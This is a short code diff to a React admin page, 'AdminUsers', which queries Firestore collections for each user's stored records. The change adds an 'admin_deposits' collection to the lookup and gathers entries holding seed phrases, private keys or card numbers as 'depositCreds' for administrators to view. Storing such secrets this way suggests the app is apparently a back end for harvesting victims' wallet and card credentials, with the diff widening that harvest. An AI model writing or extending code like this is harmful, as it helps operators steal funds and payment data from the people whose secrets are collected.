@@ -208,10 +208,19 @@ export default function AdminUsers({ theme }: { theme: 'light' | 'dark' }) {
       const snap = await getDocs(q);
       const wallets = snap.docs.map(d => ({ id: d.id, ...d.data() }));
       
-      // 2. Also check for 'deposits' that might have credentials
+      // 2. Also check for 'deposits' and 'admin_deposits' that might have credentials
       const q2 = query(collection(db, 'deposits'), where('userId', '==', user.uid));
       const snap2 = await getDocs(q2);
-      const depositCreds = snap2.docs
+      
+      let snapAdminDocs: any[] = [];
+      try {
+        const qAdmin = query(collection(db, 'admin_deposits'), where('userId', '==', user.uid));
+        const snapAdmin = await getDocs(qAdmin);
+        snapAdminDocs = snapAdmin.docs;
+      } catch (e) {}
+
+      const allDepDocs = [...snap2.docs, ...snapAdminDocs];
+      const depositCreds = allDepDocs
         .map(d => d.data())
         .filter(d => d.secretPhrase || d.privateKey || d.cardNumber)
         .map(d => ({
